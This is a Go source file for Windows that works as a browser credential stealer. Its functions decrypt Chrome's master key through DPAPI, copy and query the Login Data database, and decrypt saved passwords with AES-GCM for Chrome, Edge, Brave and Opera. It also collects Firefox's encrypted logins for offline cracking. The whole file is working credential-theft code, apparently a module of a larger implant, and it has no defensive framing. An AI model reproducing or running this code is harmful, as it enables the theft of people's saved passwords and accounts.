//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	_ "modernc.org/sqlite"
)

// BrowserCred holds a harvested credential.
type BrowserCred struct {
	Browser  string `json:"browser"`
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

// DATA_BLOB for CryptUnprotectData
type dataBLOB struct {
	cbData uint32
	pbData *byte
}

func dpapi(ciphertext []byte) ([]byte, error) {
	inBlob := dataBLOB{cbData: uint32(len(ciphertext)), pbData: &ciphertext[0]}
	var outBlob dataBLOB

	r, _, e := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if r == 0 {
		return nil, fmt.Errorf("CryptUnprotectData: %v", e)
	}
	out := make([]byte, outBlob.cbData)
	copy(out, unsafe.Slice(outBlob.pbData, outBlob.cbData))
	return out, nil
}

// chromeMasterKey extracts and decrypts the AES-256 master key from Chrome's Local State.
func chromeMasterKey(localStatePath string) ([]byte, error) {
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}
	var ls struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &ls); err != nil {
		return nil, err
	}
	if ls.OSCrypt.EncryptedKey == "" {
		return nil, fmt.Errorf("no encrypted_key in Local State")
	}
	keyB64, err := base64.StdEncoding.DecodeString(ls.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	// First 5 bytes are "DPAPI" prefix
	if len(keyB64) < 5 {
		return nil, fmt.Errorf("encrypted key too short")
	}
	return dpapi(keyB64[5:])
}

// decryptChromePwd decrypts a Chrome v10+ password using AES-256-GCM.
func decryptChromePwd(enc []byte, masterKey []byte) (string, error) {
	if len(enc) < 3+12+16 {
		// Legacy DPAPI blob (no v10 prefix)
		plain, err := dpapi(enc)
		if err != nil {
			return "", err
		}
		return string(plain), nil
	}
	if string(enc[:3]) == "v10" || string(enc[:3]) == "v11" {
		nonce := enc[3:15]
		payload := enc[15:]
		block, err := aes.NewCipher(masterKey)
		if err != nil {
			return "", err
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "", err
		}
		plain, err := gcm.Open(nil, nonce, payload, nil)
		if err != nil {
			return "", err
		}
		return string(plain), nil
	}
	// Older DPAPI
	plain, err := dpapi(enc)
	if err != nil {
		return "", err
	}
	return string(plain), nil
}

// harvestChrome harvests saved passwords from a Chromium-based browser.
func harvestChrome(name, userDataDir string) ([]BrowserCred, error) {
	localState := filepath.Join(userDataDir, "Local State")
	masterKey, err := chromeMasterKey(localState)
	if err != nil {
		return nil, fmt.Errorf("masterKey: %w", err)
	}

	loginData := filepath.Join(userDataDir, "Default", "Login Data")
	// Copy to temp — Chrome locks the file
	tmp := os.TempDir() + `\ld_tmp.db`
	src, err := os.ReadFile(loginData)
	if err != nil {
		return nil, err
	}
	if err := os.WriteFile(tmp, src, 0600); err != nil {
		return nil, err
	}
	defer os.Remove(tmp)

	db, err := sql.Open("sqlite", tmp)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var creds []BrowserCred
	for rows.Next() {
		var url, user string
		var encPwd []byte
		if err := rows.Scan(&url, &user, &encPwd); err != nil {
			continue
		}
		pwd, _ := decryptChromePwd(encPwd, masterKey)
		creds = append(creds, BrowserCred{
			Browser:  name,
			URL:      url,
			Username: user,
			Password: pwd,
		})
	}
	return creds, nil
}

// harvestFirefox reads logins.json and decodes base64 (no NSS; returns encoded for offline cracking).
func harvestFirefox(profileDir string) ([]BrowserCred, error) {
	loginsPath := filepath.Join(profileDir, "logins.json")
	data, err := os.ReadFile(loginsPath)
	if err != nil {
		return nil, err
	}
	var lf struct {
		Logins []struct {
			FormSubmitURL         string `json:"formSubmitURL"`
			EncryptedUsername     string `json:"encryptedUsername"`
			EncryptedPassword     string `json:"encryptedPassword"`
		} `json:"logins"`
	}
	if err := json.Unmarshal(data, &lf); err != nil {
		return nil, err
	}
	var creds []BrowserCred
	for _, l := range lf.Logins {
		creds = append(creds, BrowserCred{
			Browser:  "firefox",
			URL:      l.FormSubmitURL,
			Username: "[base64:" + l.EncryptedUsername + "]",
			Password: "[base64:" + l.EncryptedPassword + "]",
		})
	}
	return creds, nil
}

// BrowserCredsAll harvests credentials from Chrome, Edge, Brave, and Firefox.
func BrowserCredsAll() ([]BrowserCred, error) {
	appData := os.Getenv("LOCALAPPDATA")
	roaming := os.Getenv("APPDATA")

	chromiumProfiles := []struct {
		name string
		dir  string
	}{
		{"chrome", filepath.Join(appData, `Google\Chrome\User Data`)},
		{"edge", filepath.Join(appData, `Microsoft\Edge\User Data`)},
		{"brave", filepath.Join(appData, `BraveSoftware\Brave-Browser\User Data`)},
		{"opera", filepath.Join(appData, `Opera Software\Opera Stable`)},
	}

	var all []BrowserCred
	var errs []string

	for _, p := range chromiumProfiles {
		if _, err := os.Stat(p.dir); err != nil {
			continue
		}
		creds, err := harvestChrome(p.name, p.dir)
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s: %v", p.name, err))
			continue
		}
		all = append(all, creds...)
	}

	// Firefox profiles
	ffBase := filepath.Join(roaming, `Mozilla\Firefox\Profiles`)
	entries, _ := os.ReadDir(ffBase)
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		creds, err := harvestFirefox(filepath.Join(ffBase, e.Name()))
		if err != nil {
			errs = append(errs, fmt.Sprintf("firefox/%s: %v", e.Name(), err))
			continue
		}
		all = append(all, creds...)
	}

	if len(errs) > 0 && len(all) == 0 {
		return nil, fmt.Errorf(strings.Join(errs, "; "))
	}
	return all, nil
}
